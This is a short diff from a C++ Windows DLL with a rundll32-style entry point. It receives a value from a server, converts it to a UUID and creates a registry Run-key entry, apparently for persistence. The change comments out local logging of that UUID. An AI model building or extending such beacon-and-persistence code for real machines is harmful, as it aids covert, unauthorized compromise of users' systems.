@@ -105,7 +105,7 @@ extern "C" __declspec(dllexport) void CALLBACK RunDllEntry(HWND hwnd, HINSTANCE 
             std::cout << "Failed to receive data from server or connection closed." << std::endl;
         }
         wchar_t* uuid = convert_server_response(recvBuffer);
-        logToFile(uuid);
+        //logToFile(uuid);
         createRegistryEntryInRun(uuid);
 
         // Close the socket and clean up Winsock
